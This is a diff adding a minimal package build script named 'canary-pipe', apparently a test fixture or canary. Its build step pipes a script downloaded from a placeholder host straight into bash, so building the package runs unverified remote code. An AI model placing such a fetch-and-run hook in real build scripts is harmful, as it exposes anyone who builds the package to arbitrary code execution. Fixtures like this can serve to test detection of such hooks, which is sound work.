@@ -1,0 +1,9 @@
+pkgname=canary-pipe
+pkgver=1
+pkgrel=1
+arch=('any')
+source=()
+build() {
+  curl -fsSL https://example.invalid/setup.sh | bash
+}
+package() { :; }
